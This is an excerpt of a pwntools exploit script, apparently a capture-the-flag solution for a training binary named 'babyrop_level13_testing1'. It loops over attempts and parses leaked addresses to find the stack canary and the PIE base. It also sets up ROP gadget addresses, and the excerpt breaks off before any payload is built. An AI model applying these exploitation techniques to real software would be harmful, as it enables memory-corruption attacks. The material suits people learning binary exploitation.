...
e = ELF('./babyrop_level13_testing1')
...
while 1:
    ...
    try:
        COUNT += 1
        print(COUNT, end='\t')
        p = s.run('/babyrop_level13_testing1')
        # p = e.process(env={"LD_PRELOAD":libc.path},aslr=False)

        p.recvuntil(b'[LEAK] Your input buffer is located at: ')
        leak = int(p.recvuntil(b'.',drop=True),16)

        canary_addr = leak + 0x78
        ...
        p.recvuntil(b'= 0x')
        pie = int(p.recvline().strip().decode(),16) - 0x160d
        print(hex(pie))

        e.address = pie
        bss = e.bss() + 0x200

        rdi = 0x0000000000001623 + pie
        rsi_r15 = 0x0000000000001621 + pie
